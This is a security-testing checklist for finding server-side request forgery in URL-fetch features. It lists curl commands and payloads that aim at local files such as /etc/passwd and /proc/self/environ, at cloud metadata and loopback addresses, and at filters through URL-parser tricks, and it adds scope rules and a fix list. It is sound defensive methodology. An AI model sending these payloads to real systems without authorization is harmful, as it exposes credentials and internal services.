# SSRF URL Fetcher Recon Checklist

## Goal

Determine whether a server-side URL fetch/preview feature can reach local files, internal services, or cloud metadata through attacker-controlled URLs.

## 1. Scope Confirmation

- Confirm the target is a lab, owned app, in-scope target, or defensive review.
- Record the target host and time.
- Avoid copying live secrets, tokens, flags, cookies, or private URLs into reusable notes.

Record:

```text
Target:
Authorization basis:
Date:
Known local path (if any):
```

## 2. Map The Fetch Surface

Find features that retrieve remote content server-side:

- URL preview
- link unfurling
- webhook tester
- import from URL
- avatar/profile fetch
- PDF/HTML render from URL
- "fetch", "proxy", "curl", "retrieve" endpoints

Record:

```text
Endpoint:
Parameter:
Method:
Response location:
Mention of local files:
```

## 3. Confirm Baseline Remote Fetch

```bash
curl -sS -X POST "https://[host]/fetch" -d "url=https://example.com/"
```

Record:

```text
Status text:
Body type:
Errors:
Timeout behavior:
```

## 4. Test file:// Early

If the app mentions a local path or generic "preview from server", test:

```text
file:///etc/passwd
file:///flag.txt
file:///proc/self/environ
```

Example:

```bash
curl -sS -X POST "https://[host]/fetch" -d "url=file:///flag.txt"
```

Record:

```text
Scheme accepted: yes/no
Status text:
Reflected content:
```

## 5. Test Internal HTTP Targets

If `file://` fails, test:

```text
http://127.0.0.1/
http://127.0.0.1:80/
http://localhost/
http://169.254.169.254/
http://[::1]/
```

Record:

```text
URL:
Status/body difference from external fetch:
Blind or reflected:
```

## 6. Test Parser Confusion If Filters Exist

When host/scheme restrictions appear present, test:

```text
https://allowed.example@127.0.0.1/
http://127.1/
http://0x7f000001/
http://0177.0.0.1/
http://127.0.0.1.nip.io/
http://localtest.me/
```

Also test:

- userinfo confusion
- fragment handling when the app appends paths
- encoded characters
- mixed slash/backslash forms if applicable

Record:

```text
Payload:
Validator behavior:
Executor behavior:
Why they differ:
```

## 7. Confirm Impact Safely

Prefer read-only proof:

- local file contents in response
- internal service banner or OpenAPI document
- metadata response shape without exfiltrating unrelated secrets

Record:

```text
Proof type:
Observed signal:
Impact:
Limitations:
```

## 8. Separate Scheme Abuse From Parser Bugs

Document precisely:

```text
file:// accepted directly
```

versus

```text
HTTP-only intended, but parser confusion reached 127.0.0.1
```

## 9. Fix Checklist

- Allowlist `http` and `https` only.
- Reject unsupported schemes before fetch.
- Resolve DNS and validate destination IPs.
- Block loopback, RFC1918, link-local, and metadata ranges.
- Do not reflect raw fetched content from unapproved targets.

## 10. Decision Checklist

- [ ] Fetch endpoint and parameter identified.
- [ ] Baseline external fetch confirmed.
- [ ] `file://` tested early.
- [ ] Internal HTTP targets tested if needed.
- [ ] Parser-confusion payloads tested only after direct scheme tests.
- [ ] Impact confirmed with minimal safe proof.
- [ ] Root cause documented clearly.
- [ ] Reusable notes exclude live secrets, tokens, and flags.
